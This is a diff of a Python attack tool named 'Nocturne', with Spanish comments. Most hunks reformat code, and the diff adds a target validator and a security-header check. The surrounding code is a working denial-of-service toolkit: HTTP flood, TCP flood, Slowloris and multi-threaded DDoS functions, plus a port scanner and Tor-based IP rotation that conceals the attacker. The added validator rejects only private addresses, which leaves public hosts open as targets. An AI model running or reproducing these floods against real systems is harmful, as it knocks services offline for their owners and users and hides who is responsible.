@@ -24,29 +24,31 @@ TOR_NEW_IDENTITY_DELAY = 5  # Segundos a esperar después de rotar IP
 
 # CERTIFICACIÓN HTTPS Y MEJORA VISUAL POR ERROR DE CERTIFICACIÓN HTTPS LO PONGO PARA EVITAR QUE HAYA ERRORES VISUALES
 import urllib3
+
 urllib3.disable_warnings()
 logging.captureWarnings(True)
 # VULNERABILIDADES EN SERVIDORES O SISTEMAS EN LOS QUE TENGAN AUTORIZACIÓN, ¿VERDAD?
 
+
 # Configuration configuracion
 class Config:
-    CONFIG_FILE = os.path.expanduser('~/.nocturne_config.json')
-    
+    CONFIG_FILE = os.path.expanduser("~/.nocturne_config.json")
+
     # Valores por defecto
     _defaults = {
-        'LANGUAGE': 'english',
-        'EMOJIS': False,
-        'MAX_WORKERS': 200,
-        'USE_TOR': True,
-        'TOR_ROTATION_INTERVAL': 30
+        "LANGUAGE": "english",
+        "EMOJIS": False,
+        "MAX_WORKERS": 200,
+        "USE_TOR": True,
+        "TOR_ROTATION_INTERVAL": 30,
     }
-    
+
     # Cargar configuración al inicio
     @classmethod
     def load_config(cls):
         if os.path.exists(cls.CONFIG_FILE):
             try:
-                with open(cls.CONFIG_FILE, 'r') as f:
+                with open(cls.CONFIG_FILE, "r") as f:
                     config = json.load(f)
                 for key, value in config.items():
                     if key in cls._defaults:
@@ -60,7 +62,7 @@ class Config:
             # Usar valores por defecto si no existe el archivo
             for key, value in cls._defaults.items():
                 setattr(cls, key, value)
-    
+
     # Guardar configuración
     @classmethod
     def save_config(cls):
@@ -68,14 +70,16 @@ class Config:
             config = {}
             for key in cls._defaults:
                 config[key] = getattr(cls, key, cls._defaults[key])
-            
-            with open(cls.CONFIG_FILE, 'w') as f:
+
+            with open(cls.CONFIG_FILE, "w") as f:
                 json.dump(config, f, indent=4)
         except Exception as e:
             print(f"Error saving config: {e}")
 
+
 # Cargar configuración al iniciar
 Config.load_config()
+
 
 class TorController:
     def __init__(self, control_port=TOR_CONTROL_PORT, password=TOR_PASSWORD):
@@ -131,11 +135,11 @@ class TorController:
             return False
 
     def get_current_ip(self, session=None):
-        """Obte """
+        """Obte"""
         try:
             if session is None:
                 session = self.get_tor_session()
-            return session.get('https://api.ipify.org').text
+            return session.get("https://api.ipify.org").text
         except Exception as e:
             print(f"Error getting IP: {e}")
             return None
@@ -147,33 +151,35 @@ class TorController:
 
         # Configurar proxy Tor
         session.proxies = {
-            'http': f'socks5h://127.0.0.1:{TOR_SOCKS_PORT}',
-            'https': f'socks5h://127.0.0.1:{TOR_SOCKS_PORT}'
+            "http": f"socks5h://127.0.0.1:{TOR_SOCKS_PORT}",
+            "https": f"socks5h://127.0.0.1:{TOR_SOCKS_PORT}",
         }
 
         # Configurar timeout
         session.timeout = 30
 
         # Configurar headers comunes
-        session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-            'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Sec-Fetch-User': '?1',
-            'Cache-Control': 'max-age=0',
-        })
+        session.headers.update(
+            {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Connection": "keep-alive",
+                "Upgrade-Insecure-Requests": "1",
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "none",
+                "Sec-Fetch-User": "?1",
+                "Cache-Control": "max-age=0",
+            }
+        )
 
         # Configurar reintentos
         retry_strategy = Retry(
             total=3,
             backoff_factor=1,
             status_forcelist=[429, 500, 502, 503, 504],
-            allowed_methods=["GET", "POST"]
+            allowed_methods=["GET", "POST"],
         )
 
         adapter = HTTPAdapter(max_retries=retry_strategy)
@@ -190,10 +196,12 @@ def restart_program():
     python = sys.executable
     os.execl(python, python, *sys.argv)
 
+
 #   ::'       Art by
 #  :: :.    Ronald Allan Stanions
 
-#GRACIAS RONALD, POR HACER PÚBLICA TU ARTE, DE CORAZÓN, NOCTURNE...
+# GRACIAS RONALD, POR HACER PÚBLICA TU ARTE, DE CORAZÓN, NOCTURNE...
+
 
 def get_random_banner():
     banners = [
@@ -222,7 +230,7 @@ def get_random_banner():
                     `:  `"""'  :'   @Nocturne
         ''',
         # Banner 2 - Estilo alternativo 1 me gusta mucho
-        r'''
+        r"""
     ███╗   ██╗ ██████╗  ██████╗████████╗██╗   ██╗██████╗ ███╗   ██╗███████╗
     ████╗  ██║██╔═══██╗██╔════╝╚══██╔══╝██║   ██║██╔══██╗████╗  ██║██╔════╝
     ██╔██╗ ██║██║   ██║██║        ██║   ██║   ██║██████╔╝██╔██╗ ██║█████╗  
@@ -230,16 +238,16 @@ def get_random_banner():
     ██║ ╚████║╚██████╔╝╚██████╗   ██║   ╚██████╔╝██║  ██║██║ ╚████║███████╗
     ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝
     ======================================================================
-        ''',
+        """,
         # Banner 3 - Estilo alternativo 2 meh
-        r'''
+        r"""
     ╔╦╗╔═╗ ╔═╗╔╦╗╦ ╦╔═╗╔╗╔╔╦╗  ╔═╗╔╦╗╔═╗╔═╗╔╦╗
     ║║║╠═╣ ║   ║ ║ ║║ ║║║║ ║║  ╠═╣ ║║║╣ ║   ║ 
     ╩ ╩╩ ╩ ╚═╝ ╩ ╚═╝╚═╝╝╚╝═╩╝  ╩ ╩═╩╝╚═╝╚═╝ ╩ 
     =========================================
-    ''',
+    """,
         # Banner 4 - Estilo alternativo 3 me encanta que parezca cascada, este y el de arriba los creo chatGPT
-        r'''
+        r"""
     ░▒▓███████▓▒░ ▒█████   ▒█████  ▄▄▄█████▓
     ░▒▓█   ▓███▄▒▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒
     ░▒███  ▓██▓  ▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░
@@ -250,9 +258,10 @@ def get_random_banner():
     ░ ░ ░ ▒    ░░░ ░ ░ ░ ░ ░ ▒    ░      
         ░ ░      ░         ░ ░           
     ===============================
-    '''
+    """,
     ]
     return random.choice(banners)
+
 
 def print_banner():
     # Mostrar un banner aleatorio, y... siii lo admito, me inspire en metasploit
@@ -274,6 +283,7 @@ def restart_program():
     python = sys.executable
     os.execl(python, python, *sys.argv)
 
+
 def get_language_selection():
     """Obtiene la selección de idioma del usuario"""
     print("\nSelect language / Selecciona idioma:")
@@ -281,7 +291,7 @@ def get_language_selection():
     print("2. Español")
     choice = input("Choice / Opción (1-2): ").strip()
 
-    if choice == '2':
+    if choice == "2":
         Config.LANGUAGE = "spanish"
         Config.EMOJIS = False
     else:
@@ -295,22 +305,60 @@ def format_message(message):
         return message
     # Remove emojis for English/professional mode
     emoji_map = {
-        '🔍': '[SCAN]', '✅': '[OK]', '🎯': '[TARGET]', '🌊': '[FLOOD]',
-        '🚀': '[START]', '⚠️': '[WARN]', '❌': '[ERROR]', '📊': '[STATS]',
-        '⏱️': '[TIME]', '📈': '[RATE]', '🌐': '[NETWORK]', '🔗': '[CONN]',
-        '📦': '[PACKET]', '🐌': '[SLOW]', '🔧': '[CONFIG]', '📡': '[SOCKET]',
-        '⏸️': '[PAUSE]', '💥': '[EXPLOSION]', '🛑': '[STOP]', '🔒': '[LOCK]',
-        '🛠️': '[TOOL]', '🎲': '[CHOICE]', '🔢': '[NUMBER]', '💬': '[MESSAGE]',
-        '🔄': '[RESTART]', '👋': '[EXIT]'
+        "🔍": "[SCAN]",
+        "✅": "[OK]",
+        "🎯": "[TARGET]",
+        "🌊": "[FLOOD]",
+        "🚀": "[START]",
+        "⚠️": "[WARN]",
+        "❌": "[ERROR]",
+        "📊": "[STATS]",
+        "⏱️": "[TIME]",
+        "📈": "[RATE]",
+        "🌐": "[NETWORK]",
+        "🔗": "[CONN]",
+        "📦": "[PACKET]",
+        "🐌": "[SLOW]",
+        "🔧": "[CONFIG]",
+        "📡": "[SOCKET]",
+        "⏸️": "[PAUSE]",
+        "💥": "[EXPLOSION]",
+        "🛑": "[STOP]",
+        "🔒": "[LOCK]",
+        "🛠️": "[TOOL]",
+        "🎲": "[CHOICE]",
+        "🔢": "[NUMBER]",
+        "💬": "[MESSAGE]",
+        "🔄": "[RESTART]",
+        "👋": "[EXIT]",
     }
     for emoji, replacement in emoji_map.items():
         message = message.replace(emoji, replacement)
     return message
 
 
+def validate_target(host):
+    """Validate the target to prevent scanning of private/reserved IPs."""
+    try:
+        ip_address = socket.gethostbyname(host)
+        if socket.inet_aton(ip_address):
+            if (
+                not ip_address.startswith("127.")
+                and not ip_address.startswith("192.168.")
+                and not ip_address.startswith("10.")
+                and not ip_address.startswith("172.")
+            ):
+                return True, ip_address
+            else:
+                return False, ip_address
+    except socket.gaierror:
+        return False, None
+    return False, None
+
+
 def port_scan(host, start_port=1, end_port=1000):
     """Enhanced port scanning"""
-    print(format_message(t.get('scanning_ports').format(start_port, end_port, host)))
+    print(format_message(t.get("scanning_ports").format(start_port, end_port, host)))
     open_ports = []
 
     def scan_port(port):
@@ -323,7 +371,7 @@ def port_scan(host, start_port=1, end_port=1000):
                         service = socket.getservbyport(port)
                     except:
                         service = "unknown"
-                    print(format_message(t.get('port_open').format(port, service)))
+                    print(format_message(t.get("port_open").format(port, service)))
                     return port
         except:
             pass
@@ -333,24 +381,24 @@ def port_scan(host, start_port=1, end_port=1000):
         results = executor.map(scan_port, range(start_port, end_port + 1))
         open_ports = [port for port in results if port is not None]
 
-    print(format_message(t.get('scan_complete').format(len(open_ports))))
+    print(format_message(t.get("scan_complete").format(len(open_ports))))
     return open_ports
 
 
 def http_flood(target_url, num_requests, delay=0.1):
     """Enhanced HTTP Flood attack"""
-    print(format_message(t.get('starting_http_flood').format(target_url)))
+    print(format_message(t.get("starting_http_flood").format(target_url)))
 
     # Normalize URL
-    if not target_url.startswith(('http://', 'https://')):
-        target_url = 'http://' + target_url
+    if not target_url.startswith(("http://", "https://")):
+        target_url = "http://" + target_url
 
     user_agents = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
     ]
 
     success_count = 0
@@ -360,28 +408,46 @@ def http_flood(target_url, num_requests, delay=0.1):
         nonlocal success_count, failed_count
         try:
             headers = {
-                'User-Agent': random.choice(user_agents),
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Connection': 'keep-alive',
-                'Cache-Control': 'no-cache',
-                'Pragma': 'no-cache'
+                "User-Agent": random.choice(user_agents),
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Connection": "keep-alive",
+                "Cache-Control": "no-cache",
+                "Pragma": "no-cache",
             }
 
-            response = requests.get(target_url, headers=headers, timeout=10, verify=False)
+            response = requests.get(
+                target_url, headers=headers, timeout=10, verify=False
+            )
             if response.status_code < 400:
                 success_count += 1
-                print(format_message(t.get('request_success').format(request_num, num_requests, response.status_code)))
+                print(
+                    format_message(
+                        t.get("request_success").format(
+                            request_num, num_requests, response.status_code
+                        )
+                    )
+                )
             else:
                 failed_count += 1
-                print(format_message(t.get('request_warning').format(request_num, num_requests, response.status_code)))
+                print(
+                    format_message(
+                        t.get("request_warning").format(
+                            request_num, num_requests, response.status_code
+                        )
+                    )
+                )
 
         except Exception as e:
             failed_count += 1
             error_msg = str(e)[:50] + "..." if len(str(e)) > 50 else str(e)
-            print(format_message(t.get('request_error').format(request_num, num_requests, error_msg)))
+            print(
+                format_message(
+                    t.get("request_error").format(request_num, num_requests, error_msg)
+                )
+            )
 
-    print(format_message(t.get('sending_requests').format(num_requests)))
+    print(format_message(t.get("sending_requests").format(num_requests)))
     start_time = time.time()
 
     with ThreadPoolExecutor(max_workers=50) as executor:
@@ -397,16 +463,16 @@ def http_flood(target_url, num_requests, delay=0.1):
     print(f"{t.get('requests_second')}: {num_requests / total_time:.2f}")
 
     return {
-        t.get('successful_requests'): success_count,
-        t.get('failed_requests'): failed_count,
-        t.get('total_time'): f"{total_time:.2f} seconds",
-        t.get('requests_second'): f"{num_requests / total_time:.2f}"
+        t.get("successful_requests"): success_count,
+        t.get("failed_requests"): failed_count,
+        t.get("total_time"): f"{total_time:.2f} seconds",
+        t.get("requests_second"): f"{num_requests / total_time:.2f}",
     }
 
 
 def tcp_flood(target_ip, target_port, num_connections, message):
     """Enhanced TCP Flood attack"""
-    print(format_message(t.get('starting_tcp_flood').format(target_ip, target_port)))
+    print(format_message(t.get("starting_tcp_flood").format(target_ip, target_port)))
 
     if not message:
         message = "TCP Flood Test Packet"
@@ -425,18 +491,28 @@ def tcp_flood(target_ip, target_port, num_connections, message):
 
             with lock:
                 connections_active += 1
-            print(format_message(t.get('connection_established').format(conn_id, connections_active)))
+            print(
+                format_message(
+                    t.get("connection_established").format(conn_id, connections_active)
+                )
+            )
 
             # Send data continuously
             packet_count = 0
             while packet_count < 100:  # Send up to 100 messages per connection
                 try:
-                    packet_msg = message + f" [Conn:{conn_id} Packet:{packet_count}]".encode()
+                    packet_msg = (
+                        message + f" [Conn:{conn_id} Packet:{packet_count}]".encode()
+                    )
                     s.send(packet_msg)
                     packet_count += 1
                     time.sleep(0.3)
                 except Exception as e:
-                    print(format_message(t.get('connection_error_send').format(conn_id, e)))
+                    print(
+                        format_message(
+                            t.get("connection_error_send").format(conn_id, e)
+                        )
+                    )
                     break
 
             s.close()
@@ -445,10 +521,10 @@ def tcp_flood(target_ip, target_port, num_connections, message):
             return True
 
         except Exception as e:
-            print(format_message(t.get('connection_failed').format(conn_id, e)))
+            print(format_message(t.get("connection_failed").format(conn_id, e)))
             return False
 
-    print(format_message(t.get('establishing_connections').format(num_connections)))
+    print(format_message(t.get("establishing_connections").format(num_connections)))
     start_time = time.time()
 
     with ThreadPoolExecutor(max_workers=num_connections) as executor:
@@ -458,31 +534,33 @@ def tcp_flood(target_ip, target_port, num_connections, message):
     successful_connections = sum(results)
 
     print(f"\n{t.get('tcp_summary')}:")
-    print(f"{t.get('successful_connections')}: {successful_connections}/{num_connections}")
+    print(
+        f"{t.get('successful_connections')}: {successful_connections}/{num_connections}"
+    )
     print(f"{t.get('total_time')}: {end_time - start_time:.2f} seconds")
 
     return {
-        t.get('successful_connections'): successful_connections,
-        t.get('total_connections'): num_connections,
-        t.get('total_time'): f"{end_time - start_time:.2f} seconds"
+        t.get("successful_connections"): successful_connections,
+        t.get("total_connections"): num_connections,
+        t.get("total_time"): f"{end_time - start_time:.2f} seconds",
     }
 
 
 def slowloris_attack(target_url, num_sockets=150):
     """Enhanced Slowloris attack"""
-    print(format_message(t.get('starting_slowloris').format(target_url)))
+    print(format_message(t.get("starting_slowloris").format(target_url)))
 
     # Parse URL
-    if not target_url.startswith(('http://', 'https://')):
-        target_url = 'http://' + target_url
+    if not target_url.startswith(("http://", "https://")):
+        target_url = "http://" + target_url
 
     parsed = urlparse(target_url)
     host = parsed.hostname
-    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
-    path = parsed.path or '/'
+    port = parsed.port or (443 if parsed.scheme == "https" else 80)
+    path = parsed.path or "/"
 
     sockets = []
-    print(format_message(t.get('configuring_sockets').format(num_sockets)))
+    print(format_message(t.get("configuring_sockets").format(num_sockets)))
 
     # Create sockets
     for i in range(num_sockets):
@@ -498,7 +576,7 @@ def slowloris_attack(target_url, num_sockets=150):
                 "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n",
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                 "Content-Length: 1000000\r\n",
-                "X-a: "
+                "X-a: ",
             ]
 
             for header in headers:
@@ -507,14 +585,18 @@ def slowloris_attack(target_url, num_sockets=150):
 
             sockets.append(s)
             if (i + 1) % 50 == 0:
-                print(format_message(t.get('sockets_connected').format(i + 1, num_sockets)))
+                print(
+                    format_message(
+                        t.get("sockets_connected").format(i + 1, num_sockets)
+                    )
+                )
 
         except Exception as e:
-            print(format_message(t.get('socket_error').format(i + 1, e)))
+            print(format_message(t.get("socket_error").format(i + 1, e)))
             break
 
-    print(format_message(t.get('sockets_active').format(len(sockets))))
-    print(format_message(t.get('press_stop')))
+    print(format_message(t.get("sockets_active").format(len(sockets))))
+    print(format_message(t.get("press_stop")))
 
     try:
         cycle = 0
@@ -535,10 +617,14 @@ def slowloris_attack(target_url, num_sockets=150):
                         pass
 
             if active_sockets != len(sockets):
-                print(format_message(t.get('sockets_active_count').format(len(sockets), num_sockets)))
+                print(
+                    format_message(
+                        t.get("sockets_active_count").format(len(sockets), num_sockets)
+                    )
+                )
 
             if not sockets:
-                print(format_message(t.get('all_sockets_closed')))
+                print(format_message(t.get("all_sockets_closed")))
                 break
 
     except KeyboardInterrupt:
@@ -550,16 +636,62 @@ def slowloris_attack(target_url, num_sockets=150):
                 s.close()
             except:
                 pass
-        print(format_message(t.get('sockets_closed').format(len(sockets))))
-    return {"message": t.get('attack_stopped')}
+        print(format_message(t.get("sockets_closed").format(len(sockets))))
+    return {"message": t.get("attack_stopped")}
+
+
+def check_security_headers(target_url):
+    """Check for common security headers in a given URL."""
+    print(format_message(t.get("checking_security_headers").format(target_url)))
+
+    if not target_url.startswith(("http://", "https://")):
+        target_url = "http://" + target_url
+
+    headers_to_check = {
+        "Strict-Transport-Security": "important",
+        "Content-Security-Policy": "important",
+        "X-Content-Type-Options": "important",
+        "X-Frame-Options": "important",
+        "Referrer-Policy": "optional",
+        "Permissions-Policy": "optional",
+    }
+
+    results = {}
+
+    try:
+        response = requests.get(target_url, timeout=10, verify=False)
+        response_headers = {k.lower(): v for k, v in response.headers.items()}
+
+        for header, importance in headers_to_check.items():
+            if header.lower() in response_headers:
+                results[header] = {
+                    "present": True,
+                    "value": response_headers[header.lower()],
+                    "importance": importance,
+                }
+            else:
+                results[header] = {
+                    "present": False,
+                    "value": None,
+                    "importance": importance,
+                }
+
+        print(format_message(t.get("security_headers_check_complete")))
+
+    except Exception as e:
+        error_msg = str(e)[:100] + "..." if len(str(e)) > 100 else str(e)
+        print(format_message(t.get("security_headers_check_error").format(error_msg)))
+        return None
+
+    return results
 
 
 def ddos_attack(target_url, duration=60):
     """Simulated DDoS attack with multiple techniques"""
-    print(format_message(t.get('starting_ddos').format(target_url, duration)))
+    print(format_message(t.get("starting_ddos").format(target_url, duration)))
 
-    if not target_url.startswith(('http://', 'https://')):
-        target_url = 'http://' + target_url
+    if not target_url.startswith(("http://", "https://")):
+        target_url = "http://" + target_url
 
     parsed = urlparse(target_url)
     host = parsed.hostname
@@ -570,27 +702,33 @@ def ddos_attack(target_url, duration=60):
     def attack_worker(worker_id):
         nonlocal requests_sent
         user_agents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
         ]
 
         while not stop_attack:
             try:
                 headers = {
-                    'User-Agent': random.choice(user_agents),
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+                    "User-Agent": random.choice(user_agents),
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                 }
 
-                response = requests.get(target_url, headers=headers, timeout=5, verify=False)
+                response = requests.get(
+                    target_url, headers=headers, timeout=5, verify=False
+                )
                 requests_sent += 1
                 if requests_sent % 100 == 0:
-                    print(format_message(t.get('worker_progress').format(worker_id, requests_sent)))
+                    print(
+                        format_message(
+                            t.get("worker_progress").format(worker_id, requests_sent)
+                        )
+                    )
 
             except Exception:
                 pass
 
-    print(format_message(t.get('starting_workers')))
+    print(format_message(t.get("starting_workers")))
     start_time = time.time()
 
     # Start workers
@@ -606,8 +744,13 @@ def ddos_attack(target_url, duration=60):
         while time.time() - start_time < duration:
             time.sleep(1)
             elapsed = time.time() - start_time
-            print(format_message(
-                t.get('time_elapsed').format(int(elapsed), requests_sent, f"{requests_sent / elapsed:.1f}")))
+            print(
+                format_message(
+                    t.get("time_elapsed").format(
+                        int(elapsed), requests_sent, f"{requests_sent / elapsed:.1f}"
+                    )
+                )
+            )
     except KeyboardInterrupt:
         print(f"\n{t.get('attack_interrupted')}")
 
@@ -620,9 +763,7 @@ def ddos_attack(target_url, duration=60):
     print(f"{t.get('requests_second')}: {requests_sent / (end_time - start_time):.2f}")
 
     return {
-        t.get('total_requests'): requests_sent,
-        t.get('total_time'): f"{end_time - start_time:.2f} seconds",
-        t.get('requests_second'): f"{requests_sent / (end_time - start_time):.2f}"
+        t.get("total_requests"): requests_sent,
+        t.get("total_time"): f"{end_time - start_time:.2f} seconds",
+        t.get("requests_second"): f"{requests_sent / (end_time - start_time):.2f}",
     }
-
-
